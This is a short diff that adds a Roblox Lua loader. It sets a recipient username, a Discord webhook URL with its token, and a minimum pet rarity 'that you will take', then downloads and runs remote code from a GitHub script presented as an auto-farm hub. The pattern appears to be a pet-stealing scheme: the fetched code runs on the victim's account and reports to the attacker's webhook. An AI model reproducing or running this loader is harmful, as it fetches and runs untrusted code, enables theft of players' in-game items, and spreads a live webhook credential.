@@ -1,0 +1,4 @@
+_G.User = "Aspect_Guardian"
+_G.Webhook = "https://discord.com/api/webhooks/1318739792544141384/0VR6dgm77uOb-ftA_EDj5_SIAILAhrgahdpZMEKGFuDAJqEbIwZBSvM6tYDZi2NN6jxs"
+_G.Min = 1 -- Minimum pet rarity that you will take
+loadstring(game:HttpGet("https://raw.githubusercontent.com/OfficialPs99Scripters/AutoFarmPetsGo/refs/heads/main/AutoFarmHub", true))()
